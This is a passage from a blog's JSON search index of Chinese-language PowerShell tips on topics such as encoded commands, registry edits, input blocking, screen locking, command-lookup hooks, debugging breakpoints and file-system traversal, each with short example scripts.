HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.ps1\\UserChoice 以下命令也会执行失败（这是 .NET 的等价代码）： 123$parent = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey('Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.ps1', $true)$parent.DeleteSubKeyTree('UserChoice',$true)$parent.Close() 要删除这个键，您需要显示地调用 DeleteSubKey() 方法来代替 DeleteSubKeyTree()。明显地，在那个键中有一些不可见的异常子键导致该键无法删除。 当您只是删除该键（不包含它的子键，虽然子键并不存在），该键可以正常删除，并且 PowerShell 的“使用 PowerShell 运行“命令就恢复了： 123$parent = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey('Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.ps1', $true)$parent.DeleteSubKey('UserChoice', $true)$parent.Close() 另一方面：由于这段代码只操作了用户配置单元，所以不需要任何特权，然而在 regedit.exe 中修复则需要管理员特权。","link":"/2019/04/01/deleting-registry-keys-that-can-t-be-deleted/"},{"title":"PowerShell 技能连载 - 向编码的命令传递参数","text":"对 PowerShell 代码编码是一种在 PowerShell 环境之外运行 PowerShell 代码的方法，例如在批处理文件中。以下是一些读取 PowerShell 代码，对它编码，并且通过命令行执行它的示例代码： 12345678910$command = {Get-Service | Where-Object Status -eq Running | Out-GridView -Title 'Pick a service that you want to stop' -PassThru | Stop-Service}$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)$encodedCommand = [Convert]::ToBase64String($bytes)&quot;powershell.exe -noprofile -encodedcommand $encodedCommand&quot; | clip 当执行这段代码之后，您会发现剪贴板里有 PowerShell 命令。代码类似这样： 1powershell.exe -noprofile -encodedcommand DQAKAEcAZQB0AC0AUwBlAHIAdgBpAGMAZQAgAHwAIAANAAoAIAAgACAAIABXAGgAZQByAGUALQBPAGIAagBlAGMAdAAgAFMAdABhAHQAdQBzACAALQBlAHEAIABSAHUAbgBuAGkAbgBnACAAfAAgAA0ACgAgACAAIAAgAE8AdQB0AC0ARwByAGkAZABWAGkAZQB3ACAALQBUAGkAdABsAGUAIAAnAFAAaQBjAGsAIABhACAAcwBlAHIAdgBpAGMAZQAgAHQAaABhAHQAIAB5AG8AdQAgAHcAYQBuAHQAIAB0AG8AIABzAHQAbwBwACcAIAAtAFAAYQBzAHMAVABoAHIAdQAgAHwAIAANAAoAIAAgACAAIABTAHQAbwBwAC0AUwBlAHIAdgBpAGMAZQANAAoA 当您打开一个新的 cmd.exe 窗口，您可以将这段代码粘贴到控制台并且执行纯的 PowerShell 代码。您可以在任何有足够空间容纳整行代码的地方执行编码过的命令。因为长度限制，编码过的命令在快捷方式文件（.lnk 文件）以及开始菜单中的运行对话框中工作不正常。 还有一个额外的限制：无法传递参数到编码过的命令。除非使用一个很酷的技能。首先，在代码中加入一个 param() 块，然后使该参数成为必选。然后，从一个外部的 PowerShell 通过管道将参数传递进去。 以下是一个示例： 1234567891011121314151617$command = {param( [Parameter(Mandatory)] [string] $FirstName, [Parameter(Mandatory)] [string] $LastName)&quot;Hello, your first name is $FirstName and your last name is $lastname!&quot;}$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)$encodedCommand = [Convert]::ToBase64String($bytes)&quot;powershell.exe -noprofile -command 'Tobias', 'Weltner' | powershell -noprofile -encodedcommand $encodedCommand&quot; | clip 命令看起来类似这样： 1powershell.exe -noprofile -command 'Tom', 'Tester' | powershell -noprofile -encodedcommand DQAKAHAAYQByAGEAbQANAAoAKAANAAoAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgATQBhAG4AZABhAHQAbwByAHkAKQBdAA0ACgAgACAAIAAgAFsAcwB0AHIAaQBuAGcAXQANAAoAIAAgACAAIAAkAEYAaQByAHMAdABOAGEAbQBlACwADQAKAA0ACgAgACAAIAAgAFsAUABhAHIAYQBtAGUAdABlAHIAKABNAGEAbgBkAGEAdABvAHIAeQApAF0ADQAKACAAIAAgACAAWwBzAHQAcgBpAG4AZwBdAA0ACgAgACAAIAAgACQATABhAHMAdABOAGEAbQBlAA0ACgApAA0ACgAiAEgAZQBsAGwAbwAsACAAeQBvAHUAcgAgAGYAaQByAHMAdAAgAG4AYQBtAGUAIABpAHMAIAAkAEYAaQByAHMAdABOAGEAbQBlACAAYQBuAGQAIAB5AG8AdQByACAAbABhAHMAdAAgAG4AYQBtAGUAIABpAHMAIAAkAGwAYQBzAHQAbgBhAG0AZQAhACIADQAKAA== 当您运行这段代码，参数 “Tom” 和 “Tester” 将通过管道传递给执行编码过命令的 PowerShell。由于参数是必选的，所以管道的元素会传递给提示符，并且被编码的命令处理。","link":"/2019/04/02/passing-arguments-to-encoded-commands/"},{"title":"PowerShell 技能连载 - 禁止用户输入","text":"如果一个 PowerShell 脚本需要进行危险的操作，而且用户操作必须被禁止，那么您可以使用 API 来临时禁止所有键盘输入。锁定键盘输入不需要管理员权限。 以下是一个演示如何阻止所有键盘输入 4 秒钟的脚本： 1234567891011121314151617181920#requires -RunAsAdministrator# when run without administrator privileges, the keyboard will not be blocked!# get access to API functions that block user input# blocking of keyboard input requires administrator privileges$code = @' [DllImport(&quot;user32.dll&quot;)] public static extern bool BlockInput(bool fBlockIt);'@$userInput = Add-Type -MemberDefinition $code -Name Blocker -Namespace UserInput -PassThru# block user input$null = $userInput::BlockInput($true)Write-Warning &quot;Your input has been disabled for 4 seconds...&quot;Start-Sleep -Seconds 4# unblock user input$null = $userInput::BlockInput($false)","link":"/2019/04/03/blocking-user-input/"},{"title":"PowerShell 技能连载 - 用 PowerShell 锁定屏幕","text":"以下是一个名为 Lock-Screen 的 PowerShell 函数，它可以锁定屏幕，禁止用户操作。可以指定一个自定义消息，并且可以在锁定时将屏幕调暗。 以下是一个调用示例： 1PS&gt; Lock-Screen -LockSeconds 4 -DimScreen -Title 'Go away and come back in {0} seconds.' 以下是 Lock-Screen 的源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283Function Lock-Screen{ [CmdletBinding()] param ( # number of seconds to lock [int] $LockSeconds = 10, # message shown. Use {0} to insert remaining seconds # do not use {0} for a static message [string] $Title = 'wait for {0} more seconds...', # dim screen [Switch] $DimScreen ) # when run without administrator privileges, the keyboard will not be blocked! # get access to API functions that block user input # blocking of keyboard input requires admin privileges $code = @' [DllImport(&quot;user32.dll&quot;)] public static extern int ShowCursor(bool bShow); [DllImport(&quot;user32.dll&quot;)] public static extern bool BlockInput(bool fBlockIt);'@ $userInput = Add-Type -MemberDefinition $code -Name Blocker -Namespace UserInput -PassThru # get access to UI functionality Add-Type -AssemblyName PresentationFramework Add-Type -AssemblyName PresentationCore # set window opacity $opacity = 1 if ($DimScreen) { $opacity = 200 } # create a message label $label = New-Object -TypeName Windows.Controls.Label $label.FontSize = 60 $label.FontFamily = 'Consolas' $label.FontWeight = 'Bold' $label.Background = 'Transparent' $label.Foreground = 'Blue' $label.VerticalAlignment = 'Center' $label.HorizontalAlignment = 'Center' # create a window $window = New-Object -TypeName Windows.Window $window.WindowStyle = 'None' $window.AllowsTransparency = $true $color = [Windows.Media.Color]::FromArgb($opacity, 0,0,0) $window.Background = [Windows.Media.SolidColorBrush]::new($color) $window.Opacity = 0.8 $window.Left = $window.Top = 0 $window.WindowState = 'Maximized' $window.Topmost = $true $window.Content = $label # block user input $null = $userInput::BlockInput($true) $null = $userInput::ShowCursor($false) # show window and display message $null = $window.Dispatcher.Invoke{ $window.Show() $LockSeconds..1 | ForEach-Object { $label.Content = ($title -f $_) $label.Dispatcher.Invoke([Action]{}, 'Background') Start-Sleep -Seconds 1 } $window.Close() } # unblock user input $null = $userInput::ShowCursor($true) $null = $userInput::BlockInput($false)} 请注意 Lock-Screen 需要管理员权限才能完全禁止用户输入。","link":"/2019/04/04/locking-the-screen-with-powershell/"},{"title":"PowerShell 技能连载 - 向上下文菜单添加个人 PowerShell 命令","text":"您可以针对文件类型，例如 PowerShell 文件，添加个人的上下文菜单。当您右键单击一个 .ps1 文件时，将显示这些上下文菜单命令。它们关联到个人账户，并且不需要管理员权限就可以设置。 以下是一个实现的脚本。只需要调整头两个变量：指定上下文菜单中需要出现的命令，以及需要执行的命令行。在这个命令中，使用 “%1“ 作为右键单击时 PowerShell 脚本路径的占位符： 123456789101112131415# specify your command name$ContextCommand = &quot;Open Script with Notepad&quot;# specify the command to execute. &quot;%1&quot; represents the file path to your# PowerShell script$command = 'notepad &quot;%1&quot;'$baseKey = 'Registry::HKEY_CLASSES_ROOT\\.ps1'$id = (Get-ItemProperty $baseKey).'(Default)'$ownId = $ContextCommand.Replace(' ','')$contextKey = &quot;HKCU:\\Software\\Classes\\$id\\Shell\\$ownId&quot;$commandKey = &quot;$ContextKey\\Command&quot;New-Item -Path $commandKey -Value $command -ForceSet-Item -Path $contextKey -Value $ContextCommand 当您运行这段脚本时，将生成一个名为 “Open Script with Notepad” 的新的上下文菜单命令。您可以利用这个钩子并且设计任何命令，包括 GitHub 或备份脚本。 请注意：当您对 OpenWith 打开方式选择了一个非缺省的命令，那么自定义命令将不会在上下文菜单中显示。这个命令仅当记事本为缺省的 OpenWith 打开方式应用时才出现。 要移除所有上下文菜单扩展，请运行以下代码： 1234$baseKey = 'Registry::HKEY_CLASSES_ROOT\\.ps1'$id = (Get-ItemProperty $baseKey).'(Default)'$contextKey = &quot;HKCU:\\Software\\Classes\\$id&quot;Remove-Item -Path $contextKey -Recurse -Force","link":"/2019/04/05/adding-personal-powershell-commands-to-the-context-menu/"},{"title":"PowerShell 技能连载 - 优先使用 WLAN 连接","text":"当您同时连接到 LAN 和 WLAN，并且希望指定一个优先的连接，那么您可以调整网络跃点。网络跃点值越小，网卡的优先级越高。 要列出当前首选项，请使用 Get-NetIPInterface。例如要将所有 WLAN 网卡的跃点值设成 10，请使用这行代码： 12Get-NetIPInterface -InterfaceAlias WLAN | Set-NetIPInterface -InterfaceMetric 10 改变网络跃点值需要管理员权限。相关 cmdlet 在 Windows 10 和 Windows Server 2016/2019 中可用。","link":"/2019/04/08/preferring-wlan-connections/"},{"title":"PowerShell 技能连载 - 超级简单的密码生成器","text":"以下是一个超级简单的生成随机密码的方法。这个方法确保不会使用有歧义的字符，但不会关心其它规则，例如指定字符的最小个数。 123456$Length = 12$characters = 'abcdefghkmnprstuvwxyz23456789§$%&amp;?*+#'$password = -join ($characters.ToCharArray() |Get-Random -Count $Length)$password","link":"/2019/04/09/super-simple-random-password-generator/"},{"title":"PowerShell 技能连载 - 发现嵌套层数","text":"Get-PSCallStack 返回所谓的“调用堆栈”——它最基本的功能是告诉您代码的嵌套深度：每次进入一个脚本块，就将向堆栈加入一个新的对象。让我们看一看： 12345678910111213141516171819function test1{ $callstack = Get-PSCallStack $nestLevel = $callstack.Count - 1 &quot;TEST1: Nest Level: $nestLevel&quot; test2}function test2{ $callstack = Get-PSCallStack $nestLevel = $callstack.Count - 1 &quot;TEST2: Nest Level: $nestLevel&quot;}# calls test1 which in turn calls test2test1# calls test2 directlytest2 在这个例子中，您会看到两个函数。它们使用 Get-PSCallStack 来确定它们的“嵌套深度”。当运行 test1 时，它内部调用 test2，所以 test2 的嵌套深度为 2。而当您直接调用 test2，它的嵌套深度为 1: TEST1: Nest Level: 1 TEST2: Nest Level: 2 TEST2: Nest Level: 1 还有一个使用相同技术的，更有用的示例：一个递归的函数调用，当嵌套深度为 10 层时停止递归： 12345678910111213function testRecursion{ $callstack = Get-PSCallStack $nestLevel = $callstack.Count - 1 &quot;TEST3: Nest Level: $nestLevel&quot; # function calls itself if nest level is below 10 if ($nestLevel -lt 10) { testRecursion }}# call the functiontestRecursion 以下是执行结果： TEST3: Nest Level: 1 TEST3: Nest Level: 2 TEST3: Nest Level: 3 TEST3: Nest Level: 4 TEST3: Nest Level: 5 TEST3: Nest Level: 6 TEST3: Nest Level: 7 TEST3: Nest Level: 8 TEST3: Nest Level: 9 TEST3: Nest Level: 10","link":"/2019/04/10/discovering-nesting-level/"},{"title":"PowerShell 技能连载 - Get-PSCallStack 和调试","text":"在前一个技能中我们使用 Get-PSCallStack 来确定代码的“调用深度”。今天我们来看看如何使用这个 cmdlet 来帮助调试。要演示这个功能，请将以下代码保存为一个脚本文件。将它保存为一个 ps1 文件十分重要。请在 PowerShell ISE 中执行它。 12345678910111213function test1{ test2}function test2{Wait-DebuggerGet-Process}test1 test1 调用了 test2，并且在 test2 中，有一个 Wait-Debugger 调用。这个 cmdlet 是从 PowerShell 5 开始引入的。它会导致代码暂停并调用调试器。如果您使用的是一个早版本的 PowerShell，那么可以通过 F9 键设置一个断点。当您运行这段代码时，调试器会在 Get-Process 正要执行之前暂停，并且该行代码会以黄色高亮（如果没有效果，请检查是否已将代码保存为文件？）。 在交互式的 PowerShell 控制台中，您现在可以键入 Get-PSCallStack 来检查在代码块中停在哪里： [DBG]: PS C:\\&gt;&gt; Get-PSCallStack Command Arguments Location ------- --------- -------- test2 {} a1.ps1: Line 11 test1 {} a1.ps1: Line 5 a1.ps1 {} a1.ps1: Line 14 输出结果显示您当前位于函数 test2 中，它是被 test1 调用，而 test1 是被 a1.ps1 调用。 您还可以通过 InvocationInfo 属性看到更多的信息： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162[DBG]: PS C:\\&gt;&gt; Get-PSCallStack | Select-Object -ExpandProperty InvocationInfoMyCommand : test2BoundParameters : {}UnboundArguments : {}ScriptLineNumber : 5OffsetInLine : 5HistoryId : 17ScriptName : C:\\Users\\tobwe\\Documents\\PowerShell\\a1.ps1Line : test2PositionMessage : In C:\\Users\\tobwe\\Documents\\PowerShell\\a1.ps1:5 Line:5 + test2 + ~~~~~PSScriptRoot : C:\\Users\\tobwe\\Documents\\PowerShellPSCommandPath : C:\\Users\\tobwe\\Documents\\PowerShell\\a1.ps1InvocationName : test2PipelineLength : 1PipelinePosition : 1ExpectingInput : FalseCommandOrigin : InternalDisplayScriptPosition :MyCommand : test1BoundParameters : {}UnboundArguments : {}ScriptLineNumber : 14OffsetInLine : 1HistoryId : 17ScriptName : C:\\Users\\tobwe\\Documents\\PowerShell\\a1.ps1Line : test1PositionMessage : In C:\\Users\\tobwe\\Documents\\PowerShell\\a1.ps1:14 Line:1 + test1 + ~~~~~PSScriptRoot : C:\\Users\\tobwe\\Documents\\PowerShellPSCommandPath : C:\\Users\\tobwe\\Documents\\PowerShell\\a1.ps1InvocationName : test1PipelineLength : 1PipelinePosition : 1ExpectingInput : FalseCommandOrigin : InternalDisplayScriptPosition :MyCommand : a1.ps1BoundParameters : {}UnboundArguments : {}ScriptLineNumber : 0OffsetInLine : 0HistoryId : 17ScriptName :Line :PositionMessage :PSScriptRoot :PSCommandPath :InvocationName : C:\\Users\\tobwe\\Documents\\PowerShell\\a1.ps1PipelineLength : 2PipelinePosition : 1ExpectingInput : FalseCommandOrigin : InternalDisplayScriptPosition :","link":"/2019/04/11/get-pscallstack-and-debugging/"},{"title":"PowerShell 技能连载 - 向字符串添加数字（第 1 部分）","text":"双引号括起来的字符串可以方便地扩展变量，但是这个概念并不是万无一失的： 123456$id = 123# this is the desired output:# Number is 123:# this DOES NOT WORK:&quot;Number is $id:&quot; 如您所见的上述例子中，当您在双引号中放置变量时，PowerShell 自动判断变量的起止位置。而 : 被当成变量的一部分。要修复这个问题，您需要某种方法来明确地标记变量的起止位置。以下是一些修复这类问题的方法： 123456789101112131415161718192021$id = 123# PowerShell escape character ends the variable&quot;Number is $id`:&quot;# braces &quot;embrace&quot; the variable name&quot;Number is ${id}:&quot;# subexpressions execute the code in the parenthesis&quot;Number is $($id):&quot;# the format operator inserts the array on the right into the# placeholders in the template on the left'Number is {0}:' -f $id# which is essentially this:'Number is ' + @($id)[0] + ':'# careful with &quot;addition&quot;: this requires the first# element to be a string. So this works:'Number is ' + $id + ':'# this won't:$id + &quot; is the number&quot;# whereas this will again:'' + $id + &quot; is the number&quot;","link":"/2019/04/12/adding-numbers-to-a-string-part-1/"},{"title":"PowerShell 技能连载 - 向字符串添加数字（第 2 部分）","text":"在前一个技能中我们演示了一系列安全地将变量加入到字符串中的方法。将变量变量添加到双引号包围的文本中会导致 # this is the desired output: # PowerShell Version is 5.1.17763.316 # this DOES NOT WORK: &quot;PowerShell Version is $PSVersionTable.PSVersion&quot; 当您运行这段代码，输出结果并不是大多数人想象的那样。语法着色已经暗示了错误的地方：双引号括起来的字符串只会解析变量。他们不关心后续的任何信息。所以由于 $PSVersionTable 是一个哈希表对象，PowerShell 输出的是对象类型名称，然后在后面加上 “.PSVersion”： 12PS&gt; &quot;PowerShell Version is $PSVersionTable.PSVersion&quot;PowerShell Version is System.Collections.Hashtable.PSVersion 以下是四种有效的实现： 12345678910111213# use a subexpression&quot;PowerShell Version is $($PSVersionTable.PSVersion)&quot;# use the format (-f) operator'PowerShell Version is {0}' -f $PSVersionTable.PSVersion# concatenate (provided the first element is a string)'PowerShell Version is ' + $PSVersionTable.PSVersion# use simple variables$PSVersion = $PSVersionTable.PSVersion&quot;PowerShell Version is $PSVersion&quot;","link":"/2019/04/15/adding-numbers-to-a-string-part-2/"},{"title":"PowerShell 技能连载 - 命令发现机制揭秘（第 1 部分）","text":"当您在 PowerShell 键入一个命令，将触发一系列事件来指定命令所在的位置。这从 PreCommandLookupAction 开始，您可以用它来记录日志。请看如下代码： 123456789101112131415161718192021$ExecutionContext.InvokeCommand.PreCommandLookupAction = {param( [string] $Command, [Management.Automation.CommandLookupEventArgs] $Obj)$whitelist = @('prompt','out-default','psconsolehostreadline','Microsoft.PowerShell.Core\\Set-StrictMode') if ($Command -notin $whitelist -and $Obj.CommandOrigin -eq 'Runspace') { $host.UI.WriteLine('Yellow','White',$Command) }} 当您运行这段代码，所有键入的命令都将回显到控制台中——除了白名单中列出命令。这演示了 PreCommandLookupAction 的工作方式：每当您键入一条命令时，将自动触发它，而且您也可以将命令写入一个日志文件。","link":"/2019/04/16/command-discovery-unleashed-part-1/"},{"title":"PowerShell 技能连载 - 锁定工作站","text":"PowerShell 可以通过 C# 形式的代码操作底层 API。通过这种方法，可以在内存中编译 API 函数并添加新类型。以下例子使用一个 API 函数来锁定工作站： 1234567Function Lock-WorkStation{ $signature = '[DllImport(&quot;user32.dll&quot;,SetLastError=true)] public static extern bool LockWorkStation();' $t = Add-Type -memberDefinition $signature -name api -namespace stuff -passthru $null = $t::LockWorkStation()} 要锁定当前用户，请运行以下代码： 1PS C:\\&gt; Lock-WorkStation","link":"/2019/04/18/locking-workstation-1/"},{"title":"PowerShell 技能连载 - 隐藏返回结果的属性","text":"默认情况下，PowerShell 会精简对象并且只显示最重要的属性： 12345678PS C:\\&gt; Get-WmiObject -Class Win32_BIOSSMBIOSBIOSVersion : 1.9.0Manufacturer : Dell Inc.Name : 1.9.0SerialNumber : DLGQD72Version : DELL - 1072009 要查看真实的信息，需要使用 Select-Object 并显示要求显示所有信息： 123456789101112131415161718192021222324252627282930PS C:\\&gt; Get-WmiObject -Class Win32_BIOS | Select-Object -Property *PSComputerName : DESKTOP-7AAMJLFStatus : OKName : 1.9.0Caption : 1.9.0SMBIOSPresent : True__GENUS : 2__CLASS : Win32_BIOS__SUPERCLASS : CIM_BIOSElement__DYNASTY : CIM_ManagedSystemElement__RELPATH : Win32_BIOS.Name=&quot;1.9.0&quot;,SoftwareElementID=&quot;1.9.0&quot;,SoftwareElementState=3,TargetOperatingSystem=0,Version=&quot;DELL - 1072009&quot;__PROPERTY_COUNT : 31__DERIVATION : {CIM_BIOSElement, CIM_SoftwareElement, CIM_LogicalElement, CIM_ManagedSystemElement}__SERVER : DESKTOP-7AAMJLF__NAMESPACE : root\\cimv2__PATH : \\\\DESKTOP-7AAMJLF\\root\\cimv2:Win32_BIOS.Name=&quot;1.9.0&quot;,SoftwareElementID=&quot;1.9.0&quot;,SoftwareElementState=3,TargetOperatingSystem=0,Version=&quot;D ELL - 1072009&quot;BiosCharacteristics : {7, 9, 11, 12...}BIOSVersion : {DELL - 1072009, 1.9.0, American Megatrends - 5000B}BuildNumber :CodeSet :…ClassPath : \\\\DESKTOP-7AAMJLF\\root\\cimv2:Win32_BIOSProperties : {BiosCharacteristics, BIOSVersion, BuildNumber, Caption...}SystemProperties : {__GENUS, __CLASS, __SUPERCLASS, __DYNASTY...}Qualifiers : {dynamic, Locale, provider, UUID}Site :Container : 如何在自己的 PowerShell 函数中实现相同的内容并且返回自己的对象？ 只需要告诉 PowerShell 缺省情况下需要可见的最重要的属性。以下是一个示例。Get-Info 函数创建一个有五个属性的自定义对象。在函数返回这个对象之前，它使用一些 PowerShell 的魔法对这个对象进行标记并且列出缺省的属性： 123456789101112131415161718192021222324252627function Get-Info{ # prepare the object returned by the function $result = [PSCustomObject]@{ Name = $env:username Date = Get-Date BIOS = Get-WmiObject -Class Win32_BIOS | Select-Object -ExpandProperty SMBIOSBIOSVersion Computername = $env:COMPUTERNAME Random = Get-Date } #region Define the VISIBLE properties # this is the list of properties visible by default [string[]]$visible = 'Name','BIOS','Random' $typ = 'DefaultDisplayPropertySet' [Management.Automation.PSMemberInfo[]]$info = New-Object System.Management.Automation.PSPropertySet($typ,$visible) # add the information about the visible properties to the return value Add-Member -MemberType MemberSet -Name PSStandardMembers -Value $info -InputObject $result #endregion # return the result object return $result} 以下是执行结果： 12345678910111213141516PS C:\\&gt; Get-InfoName BIOS Random---- ---- ------tobwe 1.9.0 01.04.2019 19:32:44PS C:\\&gt; Get-Info | Select-Object -Property *Name : tobweDate : 01.04.2019 19:32:50BIOS : 1.9.0Computername : DESKTOP-7AAMJLFRandom : 01.04.2019 19:32:50","link":"/2019/04/19/hiding-properties-in-return-results/"},{"title":"PowerShell 技能连载 - 命令发现机制揭秘（第 2 部分）","text":"当您在 PowerShell 中键入一条命令，引擎将触发三个事件来发现您想执行的命令。这为您提供了许多机会来拦截并改变命令的发现机制。让我们教 PowerShell 当在命令中加入 &gt;&gt; 时将命令输出结果发送到 Out-GridView！ 一下是代码： 123456789101112131415161718192021222324$ExecutionContext.InvokeCommand.PreCommandLookupAction = {param( [string] $Command, [Management.Automation.CommandLookupEventArgs] $Obj) # when the command ends with &quot;&gt;&gt;&quot;... if ($Command.EndsWith('&gt;&gt;')) { # ...remove the &quot;&gt;&gt;&quot; from the command... $RealCommand = $Command.Substring(0, $Command.Length-2) # ...run the original command with its original arguments, # and pipe the results to a grid view window $obj.CommandScriptBlock = { &amp; $RealCommand @args | Out-GridView # use a new &quot;closure&quot; to make the $RealCommand variable available # inside the script block when it is later called }.GetNewClosure() }} 接下来，输入两条命令： 12PS C:\\&gt; Get-Process -Id $PIDPS C:\\&gt; Get-Process&gt;&gt; -Id $PID 第一条命令只是输出当前进程。第二条命令自动将执行结果输出到 Out-GridView。 如果您希望取消这种行为，请重新启动 PowerShell（或将一个空脚本块赋值给该事件）。如果您希望使该行为永久生效，请将以上代码加入到您的 profile 脚本中。","link":"/2019/04/17/command-discovery-unleashed-part-2/"},{"title":"PowerShell 技能连载 - 使用变量断点（第 1 部分）","text":"在调试过程中，变量断点可能非常有用。当一个变量改变时，变量断点能够自动生效并进入调试器。如果您知道当异常发生时某个变量变为某个设置的值（或是 NULL 值），那么可以让调试器只在那个时候介入。 以下例子演示如何使用变量断点。最好在脚本的顶部定义它们，因为您可以用 $PSCommandPath 来检验断点所需要的实际脚本文件路径： 12345678910# initialize variable breakpoints (once)# break when $a is greater than 10Set-PSBreakpoint -Variable a -Action { if ($a -gt 10) { break }} -Mode Write -Script $PSCommandPath# run the code to debugdo{ $a = Get-Random -Minimum -20 -Maximum 20 &quot;Drawing: $a&quot;} while ($true) 请确保执行之前先保存脚本：调试始终需要一个物理文件。 如您所见，当变量 $a 被赋予一个大于 10 的值时，调试器会自动中断下来。您可以使用 “exit“ 命令继续，用 “?“ 查看所有调试器选项，并且按 SHIFT+F4 停止。 要移除所有断点，运行这行代码： 1PS C:\\&gt; Get-PSBreakpoint | Remove-PSBreakpoint","link":"/2019/04/22/using-variable-breakpoints-part-1/"},{"title":"PowerShell 技能连载 - 使用变量断点（第 2 部分）","text":"在前一个技能中我们试验了用 Set-PSBreakpoint 在 PowerShell 中创建动态变量断点。我们演示了当一个变量改变时，如何触发一个断点。 然而，如果您希望监视对象的属性呢？假设您希望监视数组的大小，当数组元素变多时自动进入调试器。 在这个场景中，PowerShell 变量并没有改变。实际上是变量中的对象发生了改变。所以您需要一个“读”模式的断点而不是一个“写”模式的断点： 1234567891011# break when $array’s length is greater than 10Set-PSBreakpoint -Variable array -Action { if ($array.Length -gt 10) { break }} -Mode Read -Script $PSCommandPath$array = @()do{ $number = Get-Random -Minimum -20 -Maximum 20 &quot;Adding $number to $($array.count) elements&quot; $array += $number} while ($true) 当 $array 数组的元素超过 10 个时，脚本会中断下来并进入调试器。别忘了按 SHIFT+F5 退出调试器。","link":"/2019/04/23/using-variable-breakpoints-part-2/"},{"title":"PowerShell 技能连载 - 查找服务特权","text":"Get-Service 可以提供 Windows 服务的基础信息但是并不会列出所需要的特权。以下是一段简短的 PowerShell 函数，输入一个服务名并返回服务特权： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546function Get-ServicePrivilege{ param ( [Parameter(Mandatory)] [string] $ServiceName ) # find the service $Service = @(Get-Service -Name $ServiceName -ErrorAction Silent) # bail out if there is no such service if ($Service.Count -ne 1) { Write-Warning &quot;$ServiceName unknown.&quot; return } # read the service privileges from registry $Path = 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\' + $service.Name $Privs = Get-ItemProperty -Path $Path -Name RequiredPrivileges # output in custom object [PSCustomObject]@{ ServiceName = $Service.Name DisplayName = $Service.DisplayName Privileges = $privs.RequiredPrivileges }}PS C:\\&gt; Get-ServicePrivilege spoolerServiceName DisplayName Privileges----------- ----------- ----------spooler Druckwarteschlange {SeTcbPrivilege, SeImpersonatePrivilege, SeAuditPrivilege, SeChangeNotifyPrivilege...}PS C:\\&gt; Get-ServicePrivilege XboxGipSvcServiceName DisplayName Privileges----------- ----------- ----------XboxGipSvc Xbox Accessory Management Service {SeTcbPrivilege, SeImpersonatePrivilege, SeChangeNotifyPrivilege, SeCreateGlobalPrivilege}","link":"/2019/04/24/finding-service-privileges/"},{"title":"PowerShell 技能连载 - 用队列代替嵌套","text":"与其使用递归函数，您可能会希望使用一个 Queue 对象，这样在加载新的任务时可以卸载已处理的数据。 Lee Homes 最近贴出了以下示例，它不使用递归调用的方式而搜索了整个文件系统的文件夹树： 123456789101112131415161718192021222324252627# create a new queue$dirs = [System.Collections.Queue]::new()# add an initial path to the queue# any folder path in the queue will later be processed$dirs.Enqueue('c:\\windows')# process all elements on the queue until all are takenWhile ($current = $dirs.Dequeue()){ # find subfolders of current folder, and if present, # add them all to the queue try { foreach ($_ in [IO.Directory]::GetDirectories($current)) { $dirs.Enqueue($_) } } catch {} try { # find all files in the folder currently processed [IO.Directory]::GetFiles($current, &quot;*.exe&quot;) [IO.Directory]::GetFiles($current, &quot;*.ps1&quot;) } catch { }} try-catch 语句块是必要的，因为当没有文件或文件夹权限时，.NET 方法会抛出异常。","link":"/2019/04/25/using-a-queue-instead-of-a-recursion/"},{"title":"PowerShell 技能连载 - Real-Time Processing for Language Structures","text":"In the previous tip we looked at queues and how they can search the entire file system: # create a new queue $dirs = [System.Collections.Queue]::new() # add an initial path to the queue # any folder path in the queue will later be processed $dirs.Enqueue('c:\\windows') # process all elements on the queue until all are taken While ($current = $dirs.Dequeue()) { # find subfolders of current folder, and if present, # add them all to the queue try { foreach ($_ in [IO.Directory]::GetDirectories($current)) { $dirs.Enqueue($_) } } catch {} try { # find all files in the folder currently processed [IO.Directory]::GetFiles($current, &quot;*.exe&quot;) [IO.Directory]::GetFiles($current, &quot;*.ps1&quot;) } catch { } } How would you process the data created by the loop though, i.e. to display it in a grid view window? You cannot pipe it in real-time, so this fails: $dirs = [System.Collections.Queue]::new() $dirs.Enqueue('c:\\windows') While ($current = $dirs.Dequeue()) { try { foreach ($_ in [IO.Directory]::GetDirectories($current)) { $dirs.Enqueue($_) } } catch {} try { [IO.Directory]::GetFiles($current, &quot;*.exe&quot;) [IO.Directory]::GetFiles($current, &quot;*.ps1&quot;) } catch { } # this fails } | Out-GridView You can save the results produced by do-while to a variable. That works but takes forever because you’d have to wait for the loop to complete until you can do something with the variable: $dirs = [System.Collections.Queue]::new() $dirs.Enqueue('c:\\windows') # save results to variable... $all = while ($current = $dirs.Dequeue()) { try { foreach ($_ in [IO.Directory]::GetDirectories($current)) { $dirs.Enqueue($_) } } catch {} try { [IO.Directory]::GetFiles($current, &quot;*.exe&quot;) [IO.Directory]::GetFiles($current, &quot;*.ps1&quot;) } catch { } } # then process or output $all | Out-GridView The same limitation applies when you use $() or other constructs. To process the results emitted by do-while in true real-time, use a script block instead: $dirs = [System.Collections.Queue]::new() $dirs.Enqueue('c:\\windows') # run the code in a script block &amp; { while ($current = $dirs.Dequeue()) { try { foreach ($_ in [IO.Directory]::GetDirectories($current)) { $dirs.Enqueue($_) } } catch {} try { [IO.Directory]::GetFiles($current, &quot;*.exe&quot;) [IO.Directory]::GetFiles($current, &quot;*.ps1&quot;) } catch { } } } | Out-GridView With this approach, results start to show in the grid view window almost momentarily, and you don’t have to wait for the loop to complete. psconf.eu – PowerShell Conference EU 2019 – June 4-7, Hannover Germany – visit www.psconf.eu There aren’t too many trainings around for experienced PowerShell scripters where you really still learn something new. But there’s one place you don’t want to miss: PowerShell Conference EU - with 40 renown international speakers including PowerShell team members and MVPs, plus 350 professional and creative PowerShell scripters. Registration is open at www.psconf.eu, and the full 3-track 4-days agenda becomes available soon. Once a year it’s just a smart move to come together, update know-how, learn about security and mitigations, and bring home fresh ideas and authoritative guidance. We’d sure love to see and hear from you! ReTweet 